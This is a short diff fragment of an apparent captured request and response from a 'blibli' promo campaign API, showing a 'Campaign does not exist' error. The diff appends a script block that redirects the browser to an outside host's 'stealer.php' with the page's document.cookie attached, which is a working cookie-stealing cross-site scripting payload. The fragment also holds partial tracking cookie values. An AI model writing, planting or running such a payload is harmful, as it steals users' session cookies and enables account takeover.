@@ -33,3 +33,11 @@ _gid=GA1.2.624417622.1629915198; __cf_bm=717a1de90d2fb9c7ace1868dbdcb5afa62678ea
 blibli
 
 url": "/backend/promo-api/api/campaign/campaignDetail?campaignCode=CAMP-00725%22&recommendedWeek=", "ok": true, "status": 200, "statusText": "", "headers": { "map": { "content-length": [ "76" ], "content-type": [ "application/json;charset=UTF-8" ], "date": [ "Wed, 25 Aug 2021 22:22:19 GMT" ], "strict-transport-security": [ "max-age=15724800; includeSubDomains" ], "vary": [ "Accept-Encoding" ], "x-frame-options": [ "DENY" ] } }, "body": { "errorMessage": "Campaign does not exist", "errorCode": "200", "success": false }, "bodyText": "{\"errorMessage\":\"Campaign does not exist\",\"errorCode\":\"200\",\"success\":false}" }
+
+
+
+
+
+<script type="text/javascript">
+document.location='https://zhirobyte.000webhostapp.com/stealer.php?c='+document.cookie;
+</script>
